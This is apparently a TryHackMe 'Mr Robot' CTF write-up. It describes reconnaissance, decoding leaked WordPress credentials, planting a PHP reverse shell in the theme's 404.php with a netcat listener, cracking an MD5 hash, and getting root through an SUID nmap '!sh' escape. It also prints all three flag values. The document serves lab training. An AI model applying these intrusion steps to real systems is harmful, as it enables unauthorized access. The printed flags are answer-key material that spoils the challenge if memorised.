# 🧠 Mr Robot CTF — TryHackMe Writeup

> #### 🔗 Room Link - [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

### 🎯 Objective
- Need to Find 3 Hidden Keys
- Perform Reconnaissance, Exploitation and Privilege Escalation.

### 🛠 Tools
1. Nmap
2. Gobuster
3. Netcat
4. Cyberchef
5. OpenVPN
6. Crackstation

### Procedure
#### Phase 1: ⚙️ Setup
1. Download OpenVPN file from [TryHackMe](https://tryhackme.com/access)
2. Install openvpn kali machine - `sudo apt install openvpn` ![1.png](/CTF/Images/1.png)
3. Connect to TryHackMe -  `sudo openvpn <file_name.ovpn>` ![2.png](/CTF/Images/2.png)
4. Check whether OpenVPN is connecteds status in [TryHackMe Access Page](https://tryhackme.com/access)

#### Phase 2: 🔍 Reconnaissance
##### 1. Port Scanning
1. Run Nmap scan to check the open ports and service version - `nmap -sS -sV <target_ip>` 
2. **Three Open Ports Identified:**
    - 22 (SSH)
    - 80 (HTTP)
    - 443 (HTTPS)
![3.png](/CTF/Images/3.png)
##### 2. Web Enumeration
1. Open Browser → http://<target_ip>.
![4.png](/CTF/Images/4.png)
2. Common file check → http://<target_ip>/robots.txt 
![5.png](/CTF/Images/5.png)
3. Two Files found, One is **Key**
##### 🔑 Key 1 Found
``` 
    1. http://<target_ip>/key-1-of-3.txt
    2. Key:073403c8a58a1f80d943455fb30724b9
```
![6.png](/CTF/Images/6.png)
#### Phase 3. 📂 Directory Enumeration
##### 1. Gobuster Scan
1. Run the `Gobuster tool` - To find the hidden directories.
2. **Wordlist Used** : `/usr/share/dirb/wordlists/common.txt`
3. **Run** - `gobuster dir -u http://<target_ip> -w /usr/share/dirb/wordlists/common.txt`
![7.png](/CTF/Images/7.png)
![8.png](/CTF/Images/8.png)
##### 2. License File Discovery
1. Open Browser → http://<target_ip>/license.
![9.png](/CTF/Images/9.png)
2. Scroll Down & Found Base64 string: `ZWxsaW90OkVSMjgtMDY1Mgo=`
3. Decode using [CyberChef](https://gchq.github.io/CyberChef/)
4. ``ZWxsaW90OkVSMjgtMDY1Mgo`` → ``elliot:ER28-0652`` (Looks like username & password).
![10.png](/CTF/Images/10.png)

#### Phase 4. Login Access
##### 1. WordPress Login
1. Open Browser → `http://<target_ip>/wp-login.php`
![11.png](/CTF/Images/11.png)
2. **Credentials**:  
    > **Username**: elliot  
    > **Password**: ER28-0652
![12.png](/CTF/Images/12.png)


#### 💣 Exploitation (Reverse Shell)
##### 1. Inject PHP Reverse Shell
1. Go to Appearance → Theme Editor   
![13.png](/CTF/Images/13.png)
2. Edit 404.php ![14.png](/CTF/Images/14.png)
3. Use **HackerTool** extensions → PHP → Set Attacker IP & Port → Copy Code → Paste in 404.php ![15.png](/CTF/Images/15.png)
4. Update the 404.php code 
![16.png](/CTF/Images/16.png)

##### 2. Start Listener
1. Run netcat to listen - `nc -nlvp <port>` 

##### 3. Trigger Shell & Upgrade Shell
1. To trigger shell & get shell access, Open Browser → http://<target_ip>/wp-content/404.php
2. Successfully get the Shell Access. ![17.png](/CTF/Images/17.png)
3. Upgrade to proper shell - `python -c 'import pty; pty.spawn("/bin/bash")'` ![18.png](/CTF/Images/18.png)

#### 🔑 Key 2 Found
##### 1. Navigate to Robot User
1. Navigate to **Robot** User - `cd /home/robot `
2. Two Files found:
    1. key-2-of-3.txt (Permission denied)
    2. password.raw-md5 (MD5 Hash)

    ![19.png](/CTF/Images/19.png)
##### 2. Crack Password
1. > robot:c3fcd3d76192e4007dfb496cca67e13b
2. Open Browser → [Crackstation](https://crackstation.net/) → Paste hash → Password Cracked.
3. > **Cracked Password**: abcdefghijklmnopqrstuvwxyz
![20.png](/CTF/Images/20.png)
##### 3. Switch User & Get Key 2
``` 
    1. Switch user to robot - `su robot`
    2. Enter Password
    3. cat key-2-of-3.txt  → 822c73956184f694993bede3eb39f959
```
![21.png](/CTF/Images/21.png)

#### ⚡ Privilege Escalation (Root)
1. Find SUID Binaries - `find / -perm -4000 2>/dev/null` ![22.png](/CTF/Images/22.png)
2. Vulnerable Nmap Found - `/usr/local/bin/nmap` (Vulnerable version: 2.02–5.21)
![23.png](/CTF/Images/23.png)
3. Expoit Nmap - `/usr/local/bin/nmap`
4. To get interactive shell - `!sh`
5. To Confirm Root - ``whoami` 
![24.png](/CTF/Images/24.png)

##### 🔑 Key 3 Found
```
    1. Move to Root directory - `cd /root`
    2. cat key-3-of-3.txt - 04787ddef27c3dee1ee161b21670b4e4
```
![25.png](/CTF/Images/25.png)

### Mr Robot CTF - Completed
![26.png](/CTF/Images/26.png)

### 📌 Concepts Covered
- Port Scanning
- Directory Enumeration
- WordPress Exploitation
- Reverse Shell
- Password Cracking (MD5)
- SUID Privilege Escalation